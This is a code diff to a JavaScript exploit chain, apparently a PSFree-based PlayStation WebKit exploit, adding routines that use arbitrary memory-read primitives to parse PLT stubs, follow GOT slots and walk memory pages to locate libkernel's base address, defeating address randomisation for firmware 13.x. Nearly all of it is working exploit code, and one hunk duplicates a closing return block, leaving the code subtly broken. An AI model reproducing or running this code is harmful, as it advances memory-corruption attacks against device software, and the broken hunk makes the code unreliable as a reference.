@@ -183,7 +183,49 @@ function resolveImportPtr(p, webkitBase, off, fnPtr, depth) {
     return resolveImportPtr(p, webkitBase, off, tgt, depth + 1);
 }
 
+function lkAligned(lk) {
+    return lk && lk.hi >= 0x8 && (lk.low & 0x3fff) === 0;
+}
+
+/** PSFree find_base — walk back 16KB pages until ELF magic (max N pages). */
+function findModuleBaseBackward(p, addr, maxPages) {
+    if (!addr || addr.hi < 0x8) return null;
+    let page = new int64((addr.low >>> 0) & ~0x3fff, addr.hi >>> 0);
+    const limit = maxPages || 512;
+    for (let i = 0; i < limit; i++) {
+        const magic = read4p(p, page);
+        if (magic === ELF_MAGIC) return page;
+        if (magic == null) break;
+        const prev = page.sub32(0x4000);
+        if (!prev || prev.hi < 0x8) break;
+        page = prev;
+    }
+    return null;
+}
+
+/** PLT stub @ webkit+pltRva is ff 25 — read GOT slot, return target fn ptr. */
+function resolvePltImportAt(p, webkitBase, pltRva) {
+    if (pltRva == null) return null;
+    const stub = webkitBase.add32(pltRva);
+    if (read2p(p, stub) !== 0x25ff) return null;
+    const disp = s32(read4p(p, stub.add32(2)));
+    if (disp == null) return null;
+    return read8p(p, stub.add32(6 + disp));
+}
+
+/** Known __stack_chk_fail / early PLT stub RVAs from PSFree ports (low .text, NOT high IAT). */
+const IMPORT_PLT_CANDS = [
+    0x178, 0x188, 0x8d8, 0x918, 0x2438, 0x500, 0x600, 0x800, 0xa00, 0xc00,
+    0x1000, 0x1200, 0x1400, 0x1600, 0x2000,
+];
+
 function lkFromFnPtr(p, fnPtr, off, iatRva) {
+    if (!fnPtr) return null;
+
+    const walked = findModuleBaseBackward(p, fnPtr, 512);
+    if (walked && isLibkernelPrologue(p, walked))
+        return { lk: walked, iatRva, errorFn: fnPtr, via: "elf-walk" };
+
     if (isGetpidStub(fnPtr)) {
         const hit = lkFromStubAddr(p, fnPtr, off);
         if (hit)
@@ -205,10 +247,6 @@ function lkFromFnPtr(p, fnPtr, off, iatRva) {
         return { lk: pageBase, iatRva, errorFn: fnPtr, via: "page" };
 
     return null;
-}
-
-function lkAligned(lk) {
-    return lk && lk.hi >= 0x8 && (lk.low & 0x3fff) === 0;
 }
 
 /** Verify GOT slot — read8 + optional PLT hop + ≤4 follow-up reads. */
@@ -655,19 +693,128 @@ export function scanErrorIatChunk(p, webkitBase, off, state) {
     return { done: true, lk: null, state };
 }
 
+    return { done: true, lk: null, state };
+}
+
 /**
- * PLT→GOT, RELRO brute, prologue page scan, getpid stub hunt.
+ * PSFree method: __stack_chk_fail PLT in low .text → resolve_import → find_base.
+ * Does NOT touch wk___imp___error @ +0x3cb8cc8 (unmapped on 13.52).
+ */
+export function resolveLibkernelPsfree(p, webkitBase, off, opts) {
+    opts = opts || {};
+    const log = opts.log || (() => {});
+    const cap = iatCap(off);
+
+    for (let i = 0; i < IMPORT_PLT_CANDS.length; i++) {
+        const pltRva = IMPORT_PLT_CANDS[i];
+        if (pltRva >= cap) continue;
+        const fn = resolvePltImportAt(p, webkitBase, pltRva);
+        if (!fn) continue;
+        const hit = lkFromFnPtr(p, fn, off, null);
+        if (hit) {
+            saveLibkernelSession(hit.lk, hit.iatRva);
+            log("LK-PSFREE", "plt+0x" + pltRva.toString(16) + " → " + hit.lk
+                + " (" + hit.via + ")");
+            return {
+                ok: true,
+                lk: hit.lk,
+                iatRva: hit.iatRva,
+                source: "psfree+" + pltRva.toString(16),
+                pltRva,
+            };
+        }
+    }
+    return { ok: false, error: "no low PLT import matched libkernel ELF" };
+}
+
+/** Chunked scan of low .text for ff 25 PLT stubs → libkernel base. */
+function scanPsfreePltChunk(p, webkitBase, off, state) {
+    const TEXT_CAP = 0x200000;
+
+    if (!state) {
+        const textRanges = elfMappedTextRanges(p, webkitBase, off);
+        if (!textRanges.length)
+            return { done: true, lk: null, state: null, phase: "psfree-skip" };
+        state = {
+            textRanges,
+            rangeIdx: 0,
+            cursor: textRanges[0].lo,
+            endRva: Math.min(textRanges[0].hi, TEXT_CAP),
+            seen: {},
+            tried: 0,
+        };
+        return { done: false, state, phase: "psfree-start" };
+    }
+
+    let batch = 0;
+    while (state.cursor < state.endRva && batch < 512) {
+        const rva = state.cursor;
+        if (read2p(p, webkitBase.add32(rva)) === 0x25ff) {
+            const key = rva.toString(16);
+            if (!state.seen[key]) {
+                state.seen[key] = 1;
+                state.tried++;
+                const fn = resolvePltImportAt(p, webkitBase, rva);
+                if (fn) {
+                    const hit = lkFromFnPtr(p, fn, off, null);
+                    if (hit) {
+                        saveLibkernelSession(hit.lk, hit.iatRva);
+                        return {
+                            done: true,
+                            lk: hit.lk,
+                            iatRva: hit.iatRva,
+                            source: "psfree-scan+" + rva.toString(16),
+                            state,
+                            phase: "psfree-hit",
+                            tried: state.tried,
+                        };
+                    }
+                }
+            }
+        }
+        state.cursor += 4;
+        batch++;
+    }
+
+    if (state.cursor >= state.endRva) {
+        const next = state.rangeIdx + 1;
+        if (next < state.textRanges.length) {
+            state.rangeIdx = next;
+            state.cursor = state.textRanges[next].lo;
+            state.endRva = Math.min(state.textRanges[next].hi, TEXT_CAP);
+            return {
+                done: false,
+                state,
+                phase: "psfree-region",
+                cursor: state.cursor,
+            };
+        }
+        return { done: true, lk: null, state, phase: "psfree-miss", tried: state.tried };
+    }
+
+    return {
+        done: false,
+        state,
+        phase: "psfree",
+        cursor: state.cursor,
+        tried: state.tried,
+    };
+}
+
+/**
+ * PSFree candidates → PLT scan → GOT brute → prologue hunt → stub hunt.
  */
 export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
     opts = opts || {};
     if (!state) {
         state = {
-            stage: "plt",
+            stage: "psfree",
             sub: null,
             gotSlots: 0,
             pltRefs: 0,
             done: false,
             anchors: null,
+            psfreeTried: false,
         };
     }
 
@@ -678,6 +825,40 @@ export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
             const wb = ptrBig(webkitBase);
             if (nb !== wb) state.anchors.push(opts.nativeFn);
         }
+    }
+
+    if (state.stage === "psfree") {
+        if (!state.psfreeTried) {
+            state.psfreeTried = true;
+            const fast = resolveLibkernelPsfree(p, webkitBase, off, opts);
+            if (fast.ok) {
+                return {
+                    done: true,
+                    lk: fast.lk,
+                    iatRva: fast.iatRva,
+                    source: fast.source,
+                    state,
+                    phase: "psfree-hit",
+                };
+            }
+        }
+        const c = scanPsfreePltChunk(p, webkitBase, off, state.sub);
+        state.sub = c.state;
+        if (c.done && c.lk) {
+            return Object.assign({ state }, c);
+        }
+        if (c.done) {
+            state.stage = "plt";
+            state.sub = null;
+            return {
+                done: false,
+                state,
+                phase: "plt-next",
+                prev: c.phase,
+                tried: c.tried,
+            };
+        }
+        return Object.assign({ state }, c);
     }
 
     if (state.stage === "plt") {
@@ -799,8 +980,12 @@ export function resolveLibkernel(p, webkitBase, off, opts) {
         }
     }
 
-    log("LK-BLOCK", "13.00 IAT +0x3cb8cc8 unmapped — Scan libkernel or paste base");
-    return { ok: false, error: "tap Scan libkernel or paste libkernel base" };
+    const psf = resolveLibkernelPsfree(p, webkitBase, off, opts);
+    if (psf.ok)
+        return psf;
+
+    log("LK-BLOCK", "PSFree PLT miss — Scan libkernel or paste base (NOT cal/__error IAT)");
+    return { ok: false, error: "Scan libkernel (PSFree PLT) or paste base in hex box" };
 }
 
 /** Validate user-pasted libkernel base (1 read). */
